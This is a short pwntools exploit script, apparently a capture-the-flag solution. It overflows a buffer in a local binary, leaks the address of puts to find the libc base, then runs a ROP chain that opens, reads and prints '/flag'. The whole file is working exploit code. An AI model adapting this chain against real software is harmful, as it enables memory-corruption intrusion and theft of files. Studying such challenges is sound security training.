from pwn import *

context(os='linux', arch='amd64', log_level='debug')

p = process('./4')
elf = ELF('./4')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

pop_rdi = 0x4011be

#gdb.attach(p)
p.send(flat(
    b'a' * 8,
    0xdeadbeefdeadbeef,
    pop_rdi,
    elf.got['puts'],
    elf.plt['puts'],
    elf.sym['main']
))

p.recvuntil(b'hello!\n')
puts_address = u64(p.recvline()[:-1].ljust(8, b'\x00'))

libc.address = puts_address - libc.sym['puts']
log.success(f'libc base: {hex(libc.address)}')

rdi_address = libc.address + 0x2a3e5
rsi_address = libc.address + 0x2be51
rdx_rcx_rbx_address = libc.address + 0x108b03
rdx_r12_address = libc.address + 0x11f2e7
ret_address = libc.address + 0x29139

p.send(flat(
    b'a' * 8,
    0xdeadbeefdeadbeef,
    rdi_address,
    0,
    rsi_address,
    elf.bss(),
    rdx_r12_address,
    0x20, 
    0x0,
    libc.sym['read'],   #read(0, bss, 0x20);

    rdi_address, 
    elf.bss(),
    rsi_address,
    0x0,
    rdx_r12_address,
    0x0,
    0x0,
    libc.sym['open'],   #buf[] = "/flag"
                        #open(buf, 0, 0)

    rdi_address,
    0x3,
    rsi_address,
    elf.bss(),
    rdx_r12_address,
    0x20,
    0x0,
    libc.sym['read'],   #read(3, bss, 0x20)

    rdi_address,
    0x1,
    #rsi_address,
    #elf.bss(),
    #rdx_r12_address,
    #0x20,
    #0x0,
    libc.sym['write']   #write(1, bss, 0x20)
))

sleep(.1)
p.send(b'/flag')

p.interactive()